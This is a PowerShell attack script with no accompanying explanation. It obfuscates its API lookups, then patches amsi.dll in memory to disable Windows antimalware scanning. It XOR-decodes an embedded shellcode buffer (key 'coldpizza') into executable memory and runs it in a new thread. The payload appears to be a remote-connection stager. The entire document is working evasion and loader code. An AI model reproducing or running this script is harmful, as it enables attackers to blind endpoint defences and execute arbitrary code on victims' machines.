Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}
function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
    )

    
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    w`hERe-O`Bj`eCt { $_.GlobalAssemblyCache -And $_.Location.Split((('jf'+'2j'+'f2').REPlaCe('jf2','\')))[-1].Equals(('Sys'+'tem'+'.dll')) }
    $UnsafeNativeMethods = $SystemAssembly.GetType(('Microso'+'f'+'t.Win3'+'2.UnsafeNativeMet'+'h'+'o'+'d'+'s'))
    
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod(('GetMo'+'dule'+'Ha'+'ndle'))
    $GetProcAddress = $UnsafeNativeMethods.GetMethod(('Ge'+'tP'+'r'+'ocAddr'+'ess'), [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = N`E`w-ObJECt IntPtr
    $HandleRef = NE`W-o`BjEcT System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    
    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (Ne`w-`OBj`eCt Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = N`EW`-`OBject System.Reflection.AssemblyName(('Re'+'flectedD'+'e'+'lega'+'te'))
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(('InMemo'+'ryMod'+'ul'+'e'), $false)
    $TypeBuilder = $ModuleBuilder.DefineType(('MyDel'+'ega'+'teTy'+'pe'), ('Clas'+'s, Publi'+'c'+', Sealed, An'+'s'+'i'+'Class, '+'AutoClass'), [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor(('R'+'TS'+'pecia'+'l'+'Name, '+'H'+'ideBySig'+', Pub'+'lic'), [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags(('Runti'+'me, '+'Mana'+'ged'))
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', ('Public, '+'HideBySig'+', New'+'Slo'+'t, Virt'+'ua'+'l'), $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags(('Ru'+'ntim'+'e,'+' Managed'))
        
    WrITe`-o`UT`Put $TypeBuilder.CreateType()
}
$LoadLibraryAddr = get-pro`cA`d`dr`esS kernel32.dll LoadLibraryA
$LoadLibraryDelegate = G`et`-DELegAT`etYPE @([String]) ([IntPtr])
$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
$GetProcAddressAddr = GEt`-p`ROC`ADdRe`ss kernel32.dll GetProcAddress
$GetProcAddressDelegate = gET`-D`ElE`gAtetYpE @([IntPtr], [String]) ([IntPtr])
$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
$VirtualProtectAddr = g`e`T-prOc`AdDRe`sS kernel32.dll VirtualProtect
$VistualProtectDelegate =  g`e`T-dE`Le`GAteTypE @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VistualProtectDelegate)


If ([IntPtr]::Size -eq 8) {
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       
        0x49, 0x89, 0x5B, 0x08, 
        0x49, 0x89, 0x6B, 0x10, 
        0x49, 0x89, 0x73, 0x18, 
        0x57,                   
        0x41, 0x56,             
        0x41, 0x57,             
        0x48, 0x83, 0xEC, 0x70  
    )
} Else {
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,             
        0x55,                   
        0x8B, 0xEC,             
        0x83, 0xEC, 0x18,       
        0x53,                   
        0x56                    
    )
}


$hModule = $LoadLibrary.Invoke(('am'+'si.dll'))
$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule, ('Dll'+'Ge'+'tCla'+'ssObject'))
[IntPtr]$targetedAddress = [Hunter]::FindAddress($DllGetClassObjectAddress, $egg)

$oldProtectionBuffer = 0
$VirtualProtect.Invoke($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | OU`T-`NULl

$patch = [byte[]] (
    0x31, 0xC0,    
    0xC3           
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$a = 0
$VirtualProtect.Invoke($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | O`UT-nu`Ll


function LookupFunc {

        Param ($moduleName, $functionName)

        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split((('dtU'+'dtU').replACe(([cHAR]100+[cHAR]116+[cHAR]85),'\')))[-1].
      Equals(('Sys'+'tem'+'.dll')) }).GetType(('M'+'icro'+'soft.Win32.'+'Unsa'+'f'+'eNativeM'+'etho'+'ds'))
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq ('Ge'+'tP'+'r'+'ocAddres'+'s')) {$tmp+=$_}}
        return $tmp[0].Invoke($null, @(($assem.GetMethod(('Ge'+'tModu'+'leHa'+'ndle'))).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
                [Parameter(Position = 1)] [Type] $delType = [Void]
        )

        $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(('R'+'eflectedDe'+'legat'+'e'))), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule(('I'+'nMemor'+'yModul'+'e'), $false).
      DefineType(('MyDelegat'+'e'+'T'+'yp'+'e'), ('Class, Public,'+' S'+'e'+'aled, '+'An'+'siC'+'la'+'ss, A'+'uto'+'Cl'+'ass'), 
      [System.MulticastDelegate])

  $type.
    DefineConstructor(('RTS'+'pecialNa'+'me, HideB'+'y'+'Sig, P'+'ublic'), [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags(('R'+'u'+'n'+'time, '+'Managed'))

  $type.
    DefineMethod('Invoke', ('Public,'+' H'+'ideByS'+'ig'+', New'+'Sl'+'ot'+','+' Virtual'), $delType, $func).
      SetImplementationFlags(('Runtim'+'e'+', Manag'+'ed'))

        return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

$key = ('col'+'d'+'pizza')

[Byte[]] $buf = 0x9f, 0x27, 0xef, 0x80, 0x80, 0x81, 0xb6, 0x7a, 0x61, 0x63, 0x2e, 0x3d, 0x25, 0x20, 0x3b, 0x32, 0x4b, 0xb3, 0x06, 0x27, 0xe7, 0x36, 0x10, 0x21, 0xf1, 0x28, 0x79, 0x2b, 0xe4, 0x3e, 0x44, 0x21, 0x3f, 0x37, 0x4b, 0xa8, 0x2b, 0x60, 0xdb, 0x2e, 0x3a, 0x21, 0xf1, 0x08, 0x31, 0x2b, 0x5e, 0xac, 0xc8, 0x4c, 0x08, 0x06, 0x78, 0x4d, 0x43, 0x2e, 0xad, 0xad, 0x7d, 0x28, 0x7b, 0xbb, 0x83, 0x8e, 0x3d, 0x2d, 0x35, 0x38, 0xe2, 0x28, 0x5a, 0xea, 0x21, 0x53, 0x24, 0x65, 0xa0, 0x0f, 0xfb, 0x02, 0x79, 0x68, 0x6d, 0x63, 0xe1, 0x02, 0x69, 0x7a, 0x7a, 0xea, 0xe3, 0xe7, 0x6c, 0x64, 0x70, 0x21, 0xff, 0xba, 0x15, 0x04, 0x27, 0x6d, 0xb4, 0x34, 0xe2, 0x3a, 0x5a, 0x28, 0x62, 0xbf, 0x3c, 0xef, 0x38, 0x71, 0x99, 0x2c, 0x29, 0x9c, 0xa6, 0x21, 0x55, 0xb9, 0x28, 0xf1, 0x4e, 0xe9, 0x2b, 0x6e, 0xba, 0x2c, 0x41, 0xa9, 0x3b, 0xbb, 0xa8, 0x6e, 0xc3, 0x2d, 0x65, 0xb1, 0x51, 0x9a, 0x0f, 0x90, 0x2f, 0x6c, 0x20, 0x40, 0x78, 0x2c, 0x43, 0xab, 0x14, 0xbb, 0x37, 0x28, 0xef, 0x30, 0x4d, 0x33, 0x7b, 0xb1, 0x05, 0x2e, 0xe7, 0x68, 0x38, 0x2d, 0xf1, 0x3a, 0x7d, 0x2a, 0x6e, 0xbc, 0x25, 0xfb, 0x6d, 0xf2, 0x32, 0x60, 0xb3, 0x2e, 0x34, 0x25, 0x28, 0x37, 0x23, 0x20, 0x20, 0x3b, 0x2e, 0x35, 0x25, 0x2a, 0x21, 0xf9, 0x96, 0x41, 0x22, 0x3d, 0x93, 0x84, 0x28, 0x28, 0x23, 0x20, 0x29, 0xe8, 0x7d, 0x85, 0x2f, 0x8f, 0x96, 0x85, 0x27, 0x29, 0x52, 0xb4, 0x3f, 0x2d, 0xce, 0x1e, 0x13, 0x14, 0x08, 0x0d, 0x0a, 0x18, 0x64, 0x31, 0x3f, 0x32, 0xf3, 0x80, 0x2a, 0xa8, 0xae, 0x28, 0x07, 0x4f, 0x7d, 0x85, 0xb4, 0x30, 0x3c, 0x24, 0xed, 0x91, 0x3a, 0x20, 0x37, 0x50, 0xa3, 0x22, 0x5d, 0xad, 0x23, 0x3a, 0x33, 0xc0, 0x5b, 0x35, 0x16, 0xcb, 0x64, 0x70, 0x69, 0x7a, 0x85, 0xb4, 0x8b, 0x60, 0x6c, 0x64, 0x70, 0x58, 0x43, 0x48, 0x4f, 0x52, 0x59, 0x54, 0x4a, 0x44, 0x50, 0x54, 0x48, 0x55, 0x57, 0x6f, 0x36, 0x2c, 0xf9, 0xa8, 0x33, 0xbd, 0xa1, 0xd8, 0x6e, 0x6c, 0x64, 0x3d, 0x58, 0xb3, 0x29, 0x32, 0x09, 0x6c, 0x3f, 0x2d, 0xca, 0x3e, 0xf3, 0xe5, 0xa7, 0x63, 0x6f, 0x6c, 0x64, 0x8f, 0xbc, 0x92, 0xf5, 0x61, 0x63, 0x6f, 0x43, 0x52, 0x28, 0x18, 0x39, 0x39, 0x20, 0x3a, 0x56, 0x5a, 0x17, 0x34, 0x2d, 0x09, 0x42, 0x2a, 0x1b, 0x00, 0x3e, 0x29, 0x00, 0x13, 0x1d, 0x37, 0x27, 0x28, 0x5d, 0x0b, 0x51, 0x32, 0x13, 0x23, 0x3e, 0x11, 0x01, 0x21, 0x5d, 0x2a, 0x05, 0x3e, 0x4e, 0x31, 0x39, 0x27, 0x2c, 0x20, 0x0d, 0x14, 0x58, 0x37, 0x02, 0x58, 0x05, 0x1b, 0x3e, 0x28, 0x17, 0x38, 0x4a, 0x22, 0x0e, 0x09, 0x03, 0x1f, 0x02, 0x19, 0x44, 0x4d, 0x25, 0x14, 0x3b, 0x1e, 0x58, 0x14, 0x25, 0x28, 0x3e, 0x4e, 0x15, 0x0c, 0x5e, 0x54, 0x10, 0x01, 0x3a, 0x39, 0x0c, 0x57, 0x57, 0x58, 0x22, 0x32, 0x06, 0x26, 0x4f, 0x37, 0x2e, 0x1a, 0x05, 0x2b, 0x03, 0x17, 0x5b, 0x3b, 0x43, 0x35, 0x35, 0x56, 0x16, 0x0c, 0x43, 0x3c, 0x1e, 0x1f, 0x2f, 0x0b, 0x1a, 0x58, 0x0b, 0x1f, 0x3a, 0x15, 0x42, 0x20, 0x2e, 0x0a, 0x24, 0x26, 0x35, 0x3c, 0x36, 0x08, 0x59, 0x13, 0x42, 0x59, 0x2b, 0x13, 0x2b, 0x0f, 0x2d, 0x37, 0x63, 0x27, 0xe5, 0xa5, 0x23, 0x33, 0x3b, 0x22, 0x2c, 0x52, 0xa6, 0x3f, 0x2c, 0xc8, 0x69, 0x48, 0xd2, 0xe5, 0x63, 0x6f, 0x6c, 0x64, 0x20, 0x3a, 0x29, 0x33, 0xa6, 0xa1, 0x84, 0x39, 0x4a, 0x4b, 0x96, 0xaf, 0x32, 0xe8, 0xa5, 0x05, 0x66, 0x3b, 0x38, 0xe0, 0x8b, 0x10, 0x7e, 0x39, 0x3d, 0x04, 0xe4, 0x43, 0x69, 0x7a, 0x33, 0xe8, 0x83, 0x05, 0x68, 0x25, 0x29, 0x20, 0xc0, 0x0f, 0x27, 0xfd, 0xe9, 0x6c, 0x64, 0x70, 0x69, 0x85, 0xaf, 0x2c, 0x52, 0xaf, 0x3f, 0x3e, 0x38, 0xe0, 0x8b, 0x37, 0x50, 0xaa, 0x22, 0x5d, 0xad, 0x23, 0x3a, 0x33, 0xbd, 0xa3, 0x4e, 0x69, 0x74, 0x1f, 0x8f, 0xbc, 0xff, 0xba, 0x14, 0x7c, 0x27, 0xab, 0xa5, 0xf8, 0x7a, 0x7a, 0x7a, 0x28, 0xd9, 0x2b, 0x9c, 0x51, 0x90, 0x69, 0x7a, 0x7a, 0x61, 0x9c, 0xba, 0x24, 0x9b, 0xbf, 0x1d, 0x78, 0x91, 0xcb, 0x8b, 0x3a, 0x6c, 0x64, 0x70, 0x3a, 0x23, 0x10, 0x21, 0x39, 0x26, 0xe5, 0xb5, 0xb1, 0x8b, 0x6a, 0x33, 0xa6, 0xa3, 0x6f, 0x7c, 0x64, 0x70, 0x20, 0xc0, 0x22, 0xc5, 0x30, 0x8a, 0x6c, 0x64, 0x70, 0x69, 0x85, 0xaf, 0x29, 0xf0, 0x3c, 0x3f, 0x2c, 0xf9, 0x8e, 0x32, 0xf3, 0x90, 0x2b, 0xe6, 0xb6, 0x2d, 0xb7, 0xa9, 0x7a, 0x5a, 0x61, 0x63, 0x26, 0xe5, 0x9d, 0x39, 0xd3, 0x68, 0xec, 0xe8, 0x81, 0x6f, 0x6c, 0x64, 0x70, 0x96, 0xaf, 0x32, 0xe2, 0xa7, 0x4f, 0xe9, 0xa4, 0x04, 0xdb, 0x1c, 0xf1, 0x66, 0x2b, 0x6e, 0xaf, 0xe1, 0xb0, 0x1c, 0xa8, 0x22, 0xa2, 0x3b, 0x05, 0x6c, 0x3d, 0x39, 0xae, 0xb8, 0x8a, 0xd4, 0xc1, 0x39, 0x93, 0xb1

for ($i = 0; $i -lt $buf.length; $i++)
{
    $buf[$i] = [Byte]($buf[$i] -bxor $key[$i % $key.length]);
}

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)



